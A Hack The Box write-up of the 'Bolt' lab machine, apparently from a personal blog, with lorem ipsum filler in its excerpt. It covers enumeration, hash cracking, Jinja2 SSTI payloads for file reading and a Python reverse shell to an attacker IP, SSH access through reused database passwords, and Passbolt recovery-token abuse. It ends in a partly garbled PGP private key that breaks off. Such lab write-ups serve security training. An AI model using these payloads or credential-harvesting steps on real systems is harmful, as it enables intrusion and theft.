---
layout: single
title: Bolt - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-11-12
classes: wide
header:
  teaser: /assets/images/htb-writeup-bolt/bolt_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-bolt/bolt_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------

# USER

### Step 1
Standard enum with nmap, dirb, nikto, ffuf.
__nmap:__
```bash
┌──(void㉿void)-[/htb]
└─$ nmap -Pn -n -sCV 10.10.11.114  
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-05 15:05 CEST
Nmap scan report for 10.10.11.114
Host is up (0.047s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA)
|   256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA)
|_  256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title:     Starter Website -  About 
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: Passbolt | Open source password manager for teams
|_Requested resource was /auth/login?redirect=%2F
| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2021-02-24T19:11:23
|_Not valid after:  2022-02-24T19:11:23
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

__dirb:__
```bash
+ http://10.10.11.114/contact (CODE:200|SIZE:26293)
+ http://10.10.11.114/download (CODE:200|SIZE:18570)
+ http://10.10.11.114/index (CODE:308|SIZE:247)
+ http://10.10.11.114/index.html (CODE:200|SIZE:30347)
+ http://10.10.11.114/login (CODE:200|SIZE:9287)
+ http://10.10.11.114/logout (CODE:302|SIZE:209)
+ http://10.10.11.114/pricing (CODE:200|SIZE:31731)
+ http://10.10.11.114/profile (CODE:500|SIZE:290)
+ http://10.10.11.114/register (CODE:200|SIZE:11038)
+ http://10.10.11.114/services (CODE:200|SIZE:22443)
+ http://10.10.11.114/sign-up (CODE:200|SIZE:11038)
```

__ffuf:__
```bash
$ ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.11.114/FUZZ
check-email             [Status: 200, Size: 7331, Words: 1224, Lines: 147]
contact                 [Status: 200, Size: 26293, Words: 10060, Lines: 468]
download                [Status: 200, Size: 18570, Words: 5374, Lines: 346]
login                   [Status: 200, Size: 9287, Words: 2135, Lines: 173]
logout                  [Status: 302, Size: 209, Words: 22, Lines: 4]
pricing                 [Status: 200, Size: 31731, Words: 11055, Lines: 549]
register                [Status: 200, Size: 11038, Words: 3053, Lines: 199]
services                [Status: 200, Size: 22443, Words: 7170, Lines: 405]
sign-in                 [Status: 200, Size: 9287, Words: 2135, Lines: 173]
sign-up                 [Status: 200, Size: 11038, Words: 3053, Lines: 199]
```

__vhost:__ passbolt.bolt.htb

--------------------------------------

### Step 1
Going through port 80 we find a login portal, and a lot of junk text. In the Download menu we are able to download a docker image `http://bolt.htb/download`.  Load the image and enumerate it with a shell and we find a few interesting keys, nothing more however. 
```bash
┌──(void㉿void)-[/htb/bolt]
└─$ sudo docker load < image.tar
3fc64803ca2d: Loading layer [==================================================>]  4.463MB/4.463MB
73f2f98bc222: Loading layer [==================================================>]   7.68kB/7.68kB
8f2df5d06a26: Loading layer [==================================================>]  62.86MB/62.86MB
a1e4f9dc4110: Loading layer [==================================================>]  57.57MB/57.57MB
f0c4120bc314: Loading layer [==================================================>]  29.79MB/29.79MB
14ec2ed1c30d: Loading layer [==================================================>]  6.984MB/6.984MB
68c03965721f: Loading layer [==================================================>]  3.072kB/3.072kB
fec67b58fd48: Loading layer [==================================================>]  19.97kB/19.97kB
7fa1531c7420: Loading layer [==================================================>]  7.168kB/7.168kB
e45bbea785e3: Loading layer [==================================================>]  15.36kB/15.36kB
ac16908b339d: Loading layer [==================================================>]  8.192kB/8.192kB
Loaded image: flask-dashboard-adminlte_appseed-app:latest

┌──(void㉿void)-[/htb/bolt]
└─$ sudo docker run -it flask-dashboard-adminlte_appseed-app sh
/ # id && hostname
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
eefbc446e8af
```

Key in `.env`:
```bash
/ # cat .env 
DEBUG=True
SECRET_KEY=S3cr3t_K#Key
DB_ENGINE=postgresql
DB_NAME=appseed-flask
DB_HOST=localhost
DB_PORT=5432
DB_USERNAME=appseed
DB_PASS=pass
```

Key in `config.py`:
```bash
/ # cat config.py

< --- SNIP --- >

    # Set up the App SECRET_KEY
    SECRET_KEY = config('SECRET_KEY', default='S#perS3crEt_007')
	
	< --- SNIP --- >
	
    # PostgreSQL database
    SQLALCHEMY_DATABASE_URI = '{}://{}:{}@{}:{}/{}'.format(
        config( 'DB_ENGINE'   , default='postgresql'    ),
        config( 'DB_USERNAME' , default='appseed'       ),
        config( 'DB_PASS'     , default='pass'          ),
        config( 'DB_HOST'     , default='localhost'     ),
        config( 'DB_PORT'     , default=5432            ),
        config( 'DB_NAME'     , default='appseed-flask' )

```

Running the application we also find a debugger PIN:
```bash
/ # nohup  python3 run.py > log.txt 2>&1 &
/ # ps aux
PID   USER     TIME   COMMAND
    1 root       0:00 sh
   12 root       0:00 python3 run.py
   15 root       0:00 /usr/bin/python3 /run.py
   20 root       0:00 ps aux

/ # cat log.txt
[2021-10-05 14:44:01,587] INFO in run: DEBUG       = True
[2021-10-05 14:44:01,587] INFO in run: Environment = Debug
[2021-10-05 14:44:01,587] INFO in run: DBMS        = sqlite:////db.sqlite3
 * Tip: There are .env or .flaskenv files present. Do "pip install python-dotenv" to use them.
 * Serving Flask app "app" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: on
 * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
 * Restarting with stat
[2021-10-05 14:44:01,996] INFO in run: DEBUG       = True
[2021-10-05 14:44:01,997] INFO in run: Environment = Debug
[2021-10-05 14:44:01,997] INFO in run: DBMS        = sqlite:////db.sqlite3
 * Tip: There are .env or .flaskenv files present. Do "pip install python-dotenv" to use them.
 * Debugger is active!
 * Debugger PIN: 108-288-330
```

However nothing to help us progress with the box. 
On port 443 we are forwarded to a recovery site, but have no valid account to enter. 

--------------------------------------------

### Step 2
Changing the approach to a more simple, we instead unpack the image and go through all the directories and `.tar`-files manually. In  `a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar` we find the file `db.sqlite3`. Opening it up we see the table `users` and within a user and hash.
Username: `admin`
Email: `admin@bolt.htb`
Hash: `$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.`

![[bolt-01.png]]

Crack the hash and we find get the password `deadbolt`.

```bash
┌──(void㉿void)-[/htb/bolt]
└─$ hashcat -a0 -m500 sqlite3.hash /usr/share/wordlists/rockyou.txt 

$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.:deadbolt      
                                                 
Session..........: hashcat
Status...........: Cracked
```

Login to the portal (`http://bolt.htb/login)` using the found credentials - `admin:deadbolt`.

--------------------------------------------

### Step 3

On the admin-panel we directly see a chat message from Alexander Pierce:
`Hi Sarah, did you have time to check over the docker image? If not I'll get Eddie to take a look over. Our security team had a concern with it - something about e-mail?`

After being stumped for a while, I'm starting to think that I missed something in my initial enumeration. I had yet to enumerate vhosts! 

```bash
┌──(void㉿void)-[/htb/bolt]
└─$ ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://bolt.htb -H 'Host: FUZZ.bolt.htb'  -fl 505

demo                    [Status: 302, Size: 219, Words: 22, Lines: 4]
mail                    [Status: 200, Size: 4943, Words: 345, Lines: 99]
```

Trying to login on `mail.bolt.htb` using credentials `admin@bolt.htb:deadbolt` gives the error `Connection to storage server failed.` rather then invalid password. As we don't have any other users, lets move on to the demo vhost. 

Here we are able to create a new user - but we need a invite code. Following previous steps I begin to look in the image files for a hidden invite key. After some looking we a key in `41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar` --> `app/base/routes.py`:

```python
def register():
    login_form = LoginForm(request.form)
    create_account_form = CreateAccountForm(request.form)
    if 'register' in request.form:

        username  = request.form['username']
        email     = request.form['email'   ]
        code	  = request.form['invite_code']
        if code != 'XNSS-HSJW-3NGU-8XTJ':
            return render_template('code-500.html')
        data = User.query.filter_by(email=email).first()
        if data is None and code == 'XNSS-HSJW-3NGU-8XTJ':
            # Check usename exists
```

__Create a new account.
Username: `asdasd`
Email: `asdasd@bolt.htb`
Password: `asdasd`
Invite Code: `XNSS-HSJW-3NGU-8XTJ`__

--------------------------------------------

### Step 4

With access to both `mail.bolt.htb` and `demo.bolt.htb` we have a much bigger surface and after looking around the attack vectors seem small. After a while I notice that changing the username on `demo.bolt.htb` triggers a confirmation email from `support@bolt.htb`, to confirm the change. Maybe we can exploit this to with XSS to get a token, or even trigger a reverse shell? 

![[bolt-02.png]]

![[bolt-03.png]]

Trying different input results in nothing interesting, Javascript results in empty mails.
After a lot of digging I tried SSTI and to my surprise it worked! `{{7*7}}` results in a response mail with username `49`:

![[bolt-04.png]]

Input: `{{7*'7'}}`
Output: `7777777`

Following the SSTI-chart we find that it's most likely Jinja2, Twig or something unknown.

![[bolt-05.png]]

--------------------------------------------

### Step 5
Exploit the SSTI vulnerability to get file read, code execution and a reverse shell. Trying different payloads we can confirm that it's Jinja2.

__File read__
__Input:__ `{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}`
__Output:__
```bash
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin saned:x:117:123::/var/lib/saned:/usr/sbin/nologin nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false whoopsie:x:120:125::/nonexistent:/bin/false colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false eddie:x:1000:1000:Eddie Johnson,,,:/home/eddie:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin vboxadd:x:998:1::/var/run/vboxadd:/bin/false sshd:x:126:65534::/run/sshd:/usr/sbin/nologin mysql:x:127:133:MySQL Server,,,:/nonexistent:/bin/false clark:x:1001:1001:Clark Griswold,,,:/home/clark:/bin/bash postfix:x:128:134::/var/spool/postfix:/usr/sbin/nologin vmail:x:5000:5000::/var/mail:/usr/bin/nologin dovecot:x:129:136:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin dovenull:x:130:137:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
```

None of the reverse payloads from Hacktricks worked for me, however I found another Jinja2 reverse a python shell that did work! 

__Input:__ `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.10\",4488));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'")}}{%endif%}{% endfor %}`

__Output:__
```bash
┌──(void㉿void)-[/htb/bolt]
└─$ nc -lvnp 4488
listening on [any] 4488 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.114] 48068
/bin/sh: 0: can't access tty; job control turned off
$ id && hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bolt.htb
$ pwd
/var/www/demo
```

A quick look around and we see that user Eddie has mail. Maybe this is something we should look at when we have the right privs.
```bash
www-data@bolt:/var/mail$ ls -al
< --- SNIP --- >
-rw-------  1 eddie    mail  909 Feb 25  2021 eddie

www-data@bolt:/var/mail$ cat eddie
cat: eddie: Permission denied
```

--------------------------------------------

### Step 6

Enumerating the box manually we find three config files, `~/demo/config.py` and `~/dev/config.py` are both identical and use the same database. Looking through the database gives us nothing new to use.

```bash
www-data@bolt:~/demo$ cat config.py 
"""Flask Configuration"""
#SQLALCHEMY_DATABASE_URI = 'sqlite:///database.db'
SQLALCHEMY_DATABASE_URI = 'mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'kreepandcybergeek
```

The third config file, `~/roundcube/config/config.py`, points toward a new database but just like the other two - no new information.

```bash
www-data@bolt:~/roundcube/config$ cat config.inc.php

< --- SNIP --- >

verify_server_cert=false'
$config['db_dsnw'] = 'mysql://roundcubeuser:WXg5He2wHt4QYHuyGET@localhost/roundcube';
```

So we have accounted for all three http domains, next lets have a look on the https domain, passbolt.bolt.htb.

```bash
www-data@bolt:/$ find / -type d -name "passbolt" 2>/dev/null
/etc/passbolt
/usr/share/php/passbolt
/usr/share/passbolt
/var/lib/passbolt
/var/log/passbolt

www-data@bolt:/etc/passbolt$ cat passbolt.php
<--- SNIP --->
	// Database configuration.
	'Datasources' => [
		'default' => [
			'host' => 'localhost',
			'port' => '3306',
			'username' => 'passbolt',
			'password' => 'rT2;jW7<eY8!dX8}pQ8%',
			'database' => 'passboltdb'
<--- SNIP --->
	'passbolt' => [
		// GPG Configuration.
		// The keyring must to be owned and accessible by the webserver user.
		// Example: www-data user on Debian
		'gpg' => [
			// Main server key.
			'serverKey' => [
				// Server private key fingerprint.
				'fingerprint' => '59860A269E803FA094416753AB8E2EFB56A16C84',
				'public' => CONFIG . DS . 'gpg' . DS . 'serverkey.asc',
				'private' => CONFIG . DS . 'gpg' . DS . 'serverkey_private.asc',
```

Looking through the passbolt database there are no passwords or hashes to crack, instead there are pgp keys for both user Clark and Eddie - which so far leads to nothing.

From the internal enumeration we've found three passwords;
- `dXUUHSW9vBpH5qRB`
- `WXg5He2wHt4QYHuyGET`
- `rT2;jW7<eY8!dX8}pQ8%`

Testing for password reuse on our two users, Eddie and Clark, reveals a matching set of credentials! 

__`eddie:rT2;jW7<eY8!dX8}pQ8%`__

--------------------------------------------

### Step 7

Login and grab user.txt

```bash
┌──(void㉿void)-[/htb/bolt]
└─$ ssh eddie@bolt.htb                                                             
eddie@bolt.htb's password: jW7<eY8!dX8}pQ8%

eddie@bolt:~$ id && hostname
uid=1000(eddie) gid=1000(eddie) groups=1000(eddie)
bolt.htb
eddie@bolt:~$ cat user.txt 
c62e3df13f90e4aebff46002be1a088f
```

--------------------------------------------

<br>

# Root

### Step 1

`sudo -l` fails because we don't have sudo password.
As we remember from a while back, user Eddie have a mail, lets start by looking at that. 

```bash
eddie@bolt:~$ cat /var/mail/eddie 
From clark@bolt.htb  Thu Feb 25 14:20:19 2021
Return-Path: <clark@bolt.htb>
X-Original-To: eddie@bolt.htb
Delivered-To: eddie@bolt.htb
Received: by bolt.htb (Postfix, from userid 1001)
	id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST)
Subject: Important!
To: <eddie@bolt.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20210225212019.DFF264CD@bolt.htb>
Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST)
From: Clark Griswold <clark@bolt.htb>

Hey Eddie,

The password management server is up and running.  Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it.  Your private key is the only way to recover your account.
Once you're set up you can start importing your passwords.  Please be sure to keep good security in mind - there's a few things I read about in a security whitepaper that are a little concerning...

-Clark
```

<br>

[Passbolt](https://addons.mozilla.org/sv-SE/firefox/addon/passbolt/) is a Open Source Password Manager, and from scouring the database we found both Clark and Eddies PGP Public key and some passwords. 

While looking for ways to recover Clark and Eddie's accounts I came across [this post](https://community.passbolt.com/t/passbolt-self-hosted-does-not-send-password-recovery-email-only-from-administrator/3625). We extract the `token` and `user_id` from mysql and use it to access the recovery page. 
**`https://<your_domain>/setup/recover/<user_id>/<token>`**

<br>

**Clark:**
```mysql
mysql> select user_id, token from authentication_tokens where user_id = (select id from users where username = 'clark@bolt.htb') and type = 'recover' order by
 created DESC;
+--------------------------------------+--------------------------------------+
| user_id                              | token                                |
+--------------------------------------+--------------------------------------+
| 9d8a0452-53dc-4640-b3a7-9a3d86b0ff90 | 1893cd40-fae5-4dd9-9406-947620fdac66 |
+--------------------------------------+--------------------------------------+
```


**Eddie:**
```mysql
mysql> select user_id, token from authentication_tokens where user_id = (select id from users where username = 'eddie@bolt.htb') and type = 'recover' order by created DESC;
+--------------------------------------+--------------------------------------+
| user_id                              | token                                |
+--------------------------------------+--------------------------------------+
| 4e184ee6-e436-47fb-91c9-dccb57f250bc | cf880afd-d905-482e-84e0-42469662769c |
| 4e184ee6-e436-47fb-91c9-dccb57f250bc | 629845af-e964-4ef8-b7bf-68b921d013cf |
+--------------------------------------+--------------------------------------+
```

Access the recovery page and we quicky realize we need to supply a private key, something that we've yet to discover.

![[Pasted image 20211112092547.png]]

--------

<br>

### Step 2

A quick grep for a `BEGIN PGP PRIVATE` and we find an interesting log-file. 

```bash
eddie@bolt:~$ grep -iR "BEGIN PGP PRIVATE"
.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:const PRIVATE_HEADER = '-----BEGIN PGP PRIVATE KEY BLOCK-----';
.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:            // BEGIN PGP PRIVATE KEY BLOCK
.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push("-----BEGIN PGP PRIVATE KEY BLOCK-----\r\n");
Binary file .config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches
```

<br>

List the content of the file with `strings` and beautifying the json-data we get:
```json
{
   "config":{
      "log":{
         "console":false,
         "level":0
      },
      "user.firstname":"Eddie",
      "user.id":"4e184ee6-e436-47fb-91c9-dccb57f250bc",
      "user.lastname":"Johnson",
      "user.settings.securityToken.code":"GOZ",
      "user.settings.securityToken.color":"#607d8b",
      "user.settings.securityToken.textColor":"#ffffff",
      "user.settings.trustedDomain":"https://passbolt.bolt.htb",
      "user.username":"eddie@bolt.htb"
   },
   "passbolt-private-gpgkeys":"{\"MY_KEY_ID\":{\"key\":\"-----BEGIN PGP PRIVATE KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment: https://openpgpjs.org\\r\\n\\r\\n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\\r\\nJ6V/kusDdyek7yhT1dXVkZZQSeCUU��g�@�cQXO4ocMQDcj6kDLW58tV/WQKJ3duRt\\r\\n1VrD5poP49+OynR55rXtzi7skOM+0o2tcqy3JppM3egvYvXlpzXggC5b1NvS\\r\\nUCUqIkrGQRr7VTk/jwkbFt1zuWp5s8zEGV7aXbNI4cSKDsowGuTFb7cBCDGU\\r\\nNsw+14+EGQp5TrvCwHYEGAEIAAkFAmA4G2ECGwwAIQkQHCdBo9w7Sr0WIQTf\\r\\nQmvHpKivWOUO2g4cJ0Gj3DtKvf4dB/9CGuPrOfIaQtuP25S/RLVDl8XHvzPm\\r\\noRdF7iu8ULcA9gTxPn8DNbtdZEnFHHOANAHnIFGgYS4vj3Dj9Q3CEZSSVvwg\\r\\n6599FMcw9nGzypVOgqgQv8JGmIUeCipD10k8nHW7m9YBfQB04y9wJw99WNw/\\r\\nIc3vdhZ6NvsmLzYI21dnWD287sPj2tKAuhI0AqCEkiRwb4Z4CSGgJ5TgGML8\\r\\n11Izrkqamzpc6mKBGi213tYH6xel3nDJv5TKm3AGwXsAhJjJw+9K0MNARKCm\\r\\nYZFGLdtA/qMajW4/+T3DJ79YwPQOtCrFyHiWoIOTWfs4UhiUJIE4dTSsT/W0\\r\\nPSwYYWlAywj5\\r\\n=cq